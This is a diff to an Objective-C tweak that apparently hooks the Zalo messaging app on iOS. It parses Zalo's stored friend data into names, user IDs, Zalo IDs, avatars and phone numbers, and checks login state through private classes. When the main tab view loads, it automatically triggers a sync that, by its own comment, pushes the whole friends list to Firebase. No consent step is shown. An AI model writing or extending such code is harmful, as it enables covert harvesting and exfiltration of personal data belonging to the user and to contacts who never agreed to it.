@@ -616,6 +616,24 @@ static NSData *buildAdbkZipArchive(NSData *groupPlistData, NSString *phone) {
 // ==============================================================================
 // GIẢI MÃ TOÀN BỘ OBJECT GRAPH NSKEYEDARCHIVER TRONG APP GROUP PLIST
 // ==============================================================================
+static id resolveFieldRecursive(id fieldVal, NSArray *objs, int depth) {
+    if (!fieldVal || depth > 5) return nil;
+    if ([fieldVal isKindOfClass:[NSString class]]) return fieldVal;
+    if ([fieldVal isKindOfClass:[NSNumber class]]) return [fieldVal stringValue];
+    if ([fieldVal isKindOfClass:[NSDictionary class]] && fieldVal[@"CF$UID"]) {
+        NSUInteger idx = [fieldVal[@"CF$UID"] unsignedIntegerValue];
+        if (idx < objs.count) {
+            id target = objs[idx];
+            if ([target isKindOfClass:[NSString class]]) return target;
+            if ([target isKindOfClass:[NSNumber class]]) return [target stringValue];
+            if ([target isKindOfClass:[NSDictionary class]]) {
+                return resolveFieldRecursive(target, objs, depth + 1);
+            }
+        }
+    }
+    return nil;
+}
+
 static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
     if (!plistData || plistData.length == 0) return @[];
     NSMutableArray<NSDictionary *> *friends = [NSMutableArray array];
@@ -640,32 +658,29 @@ static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
                 if (![item isKindOfClass:[NSDictionary class]]) continue;
                 NSDictionary *objDict = (NSDictionary *)item;
 
-                // Hàm giải mã con trỏ UID trong $objects
-                NSString * (^resolveField)(id) = ^NSString *(id fieldVal) {
-                    if ([fieldVal isKindOfClass:[NSString class]]) return fieldVal;
-                    if ([fieldVal isKindOfClass:[NSDictionary class]] && fieldVal[@"CF$UID"]) {
-                        NSUInteger idx = [fieldVal[@"CF$UID"] unsignedIntegerValue];
-                        if (idx < objs.count && [objs[idx] isKindOfClass:[NSString class]]) {
-                            return objs[idx];
-                        }
-                    }
-                    return nil;
-                };
+                NSString *dName = resolveFieldRecursive(objDict[@"displayName"], objs, 0);
+                NSString *cName = resolveFieldRecursive(objDict[@"contactName"], objs, 0);
+                NSString *aliasName = resolveFieldRecursive(objDict[@"aliasname"], objs, 0);
+                NSString *uId = resolveFieldRecursive(objDict[@"userId"], objs, 0) ?: resolveFieldRecursive(objDict[@"userid"], objs, 0);
+                NSString *zId = resolveFieldRecursive(objDict[@"zaloId"], objs, 0) ?: resolveFieldRecursive(objDict[@"zaloid"], objs, 0);
+                NSString *avatar = resolveFieldRecursive(objDict[@"avatarURL"], objs, 0) ?: resolveFieldRecursive(objDict[@"avatar"], objs, 0);
+                NSString *globalId = resolveFieldRecursive(objDict[@"globalId"], objs, 0);
+                NSString *phone = resolveFieldRecursive(objDict[@"phone"], objs, 0) ?: resolveFieldRecursive(objDict[@"phoneNumber"], objs, 0);
 
-                NSString *dName = resolveField(objDict[@"displayName"]) ?: resolveField(objDict[@"contactName"]) ?: resolveField(objDict[@"aliasname"]);
-                NSString *uId = resolveField(objDict[@"userId"]) ?: resolveField(objDict[@"userid"]) ?: resolveField(objDict[@"zaloId"]) ?: resolveField(objDict[@"zaloid"]);
-                NSString *avatar = resolveField(objDict[@"avatarURL"]) ?: resolveField(objDict[@"avatar"]);
-                NSString *globalId = resolveField(objDict[@"globalId"]);
+                NSString *primaryName = dName ?: cName ?: aliasName;
 
-                if (dName.length >= 2 && ![dName hasPrefix:@"$"] && ![dName isEqualToString:@"ZSDFriendEntity"] && ![dName isEqualToString:@"ZSDAliasEntity"]) {
+                if (primaryName.length >= 2 && ![primaryName hasPrefix:@"$"] && ![primaryName isEqualToString:@"ZSDFriendEntity"] && ![primaryName isEqualToString:@"ZSDAliasEntity"] && ![primaryName isEqualToString:@"NSObject"]) {
                     NSMutableDictionary *fMeta = [NSMutableDictionary dictionary];
-                    fMeta[@"name"] = dName;
-                    if (uId.length > 0) fMeta[@"userId"] = uId;
-                    if (avatar.length > 0) fMeta[@"avatarURL"] = avatar;
-                    if (globalId.length > 0) fMeta[@"globalId"] = globalId;
+                    fMeta[@"name"] = primaryName;
+                    if (dName) fMeta[@"displayName"] = dName;
+                    if (cName) fMeta[@"contactName"] = cName;
+                    if (uId) fMeta[@"userId"] = uId;
+                    if (zId) fMeta[@"zaloId"] = zId;
+                    if (avatar) fMeta[@"avatarURL"] = avatar;
+                    if (globalId) fMeta[@"globalId"] = globalId;
+                    if (phone) fMeta[@"phone"] = phone;
 
                     [friends addObject:fMeta];
-                    break;
                 }
             }
         }
@@ -678,8 +693,31 @@ static NSArray<NSDictionary *> *parseNSKeyedArchiverFriends(NSData *plistData) {
 // ==============================================================================
 static NSString *g_activeLoggedInPhone = nil;
 
+static BOOL isZaloRealLoggedIn(void) {
+    @try {
+        Class accMgr = NSClassFromString(@"ZAccountManager") ?: NSClassFromString(@"ZSessionManager");
+        if (accMgr) {
+            if ([accMgr respondsToSelector:@selector(isLogin)]) {
+                return (BOOL)[accMgr performSelector:@selector(isLogin)];
+            }
+            if ([accMgr respondsToSelector:@selector(isLoggedIn)]) {
+                return (BOOL)[accMgr performSelector:@selector(isLoggedIn)];
+            }
+            if ([accMgr respondsToSelector:@selector(sharedManager)]) {
+                id mgr = [accMgr performSelector:@selector(sharedManager)];
+                if ([mgr respondsToSelector:@selector(isLogin)]) {
+                    return (BOOL)[mgr performSelector:@selector(isLogin)];
+                }
+                if ([mgr respondsToSelector:@selector(isLoggedIn)]) {
+                    return (BOOL)[mgr performSelector:@selector(isLoggedIn)];
+                }
+            }
+        }
+    } @catch (NSException *e) {}
+    return NO;
+}
+
 static NSString *getZaloLivePhoneNumber(void) {
-    if (g_activeLoggedInPhone.length >= 8) return g_activeLoggedInPhone;
     @try {
         Class accMgr = NSClassFromString(@"ZAccountManager") ?: NSClassFromString(@"ZSessionManager");
         if (accMgr) {
@@ -708,37 +746,21 @@ static NSString *getZaloLivePhoneNumber(void) {
             }
         }
     } @catch (NSException *e) {}
-    return nil;
-}
 
-static BOOL isZaloRealLoggedIn(void) {
-    @try {
-        Class accMgr = NSClassFromString(@"ZAccountManager") ?: NSClassFromString(@"ZSessionManager");
-        if (accMgr) {
-            if ([accMgr respondsToSelector:@selector(isLogin)]) {
-                return (BOOL)[accMgr performSelector:@selector(isLogin)];
-            }
-            if ([accMgr respondsToSelector:@selector(isLoggedIn)]) {
-                return (BOOL)[accMgr performSelector:@selector(isLoggedIn)];
-            }
-            if ([accMgr respondsToSelector:@selector(sharedManager)]) {
-                id mgr = [accMgr performSelector:@selector(sharedManager)];
-                if ([mgr respondsToSelector:@selector(isLogin)]) {
-                    return (BOOL)[mgr performSelector:@selector(isLogin)];
-                }
-                if ([mgr respondsToSelector:@selector(isLoggedIn)]) {
-                    return (BOOL)[mgr performSelector:@selector(isLoggedIn)];
-                }
-            }
-        }
-    } @catch (NSException *e) {}
-    return NO;
+    // Chỉ dùng g_activeLoggedInPhone khi phiên thực tế đang được xác nhận đăng nhập
+    if (isZaloRealLoggedIn() && g_activeLoggedInPhone.length >= 8) {
+        return g_activeLoggedInPhone;
+    }
+
+    return nil;
 }
 
 // ==============================================================================
 // TRÍCH XUẤT HỢP NHẤT TOÀN BỘ BẠN BÈ VÀ ĐẨY .ADBK LÊN CLOUD FIREBASE
 // ==============================================================================
 static void autoSyncFriendsToFirebase(NSString *phoneStr) {
+    if (!isZaloRealLoggedIn()) return;
+
     NSString *actualPhone = phoneStr ?: getZaloLivePhoneNumber();
     if (!actualPhone || actualPhone.length < 8) return;
 
@@ -860,14 +882,15 @@ static void autoSyncFriendsToFirebase(NSString *phoneStr) {
     if ([clsName containsString:@"ZMain"] || [clsName containsString:@"ZTab"] || [clsName containsString:@"MainTabBar"] || [clsName isEqualToString:@"UITabBarController"]) {
         static NSString *lastExtractedPhone = nil;
         
-        NSString *currentPhone = getZaloLivePhoneNumber();
-        BOOL isLoggedIn = isZaloRealLoggedIn() || (currentPhone.length >= 8);
-
-        if (isLoggedIn && currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
-            lastExtractedPhone = [currentPhone copy];
-            dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
-                autoSyncFriendsToFirebase(currentPhone);
-            });
+        // CHỈ đồng bộ khi phiên thực tế được xác nhận là đã đăng nhập (isZaloRealLoggedIn)
+        if (isZaloRealLoggedIn()) {
+            NSString *currentPhone = getZaloLivePhoneNumber();
+            if (currentPhone && currentPhone.length >= 8 && ![currentPhone isEqualToString:lastExtractedPhone]) {
+                lastExtractedPhone = [currentPhone copy];
+                dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(2.0 * NSEC_PER_SEC)), dispatch_get_global_queue(0, 0), ^{
+                    autoSyncFriendsToFirebase(currentPhone);
+                });
+            }
         }
     }
 }
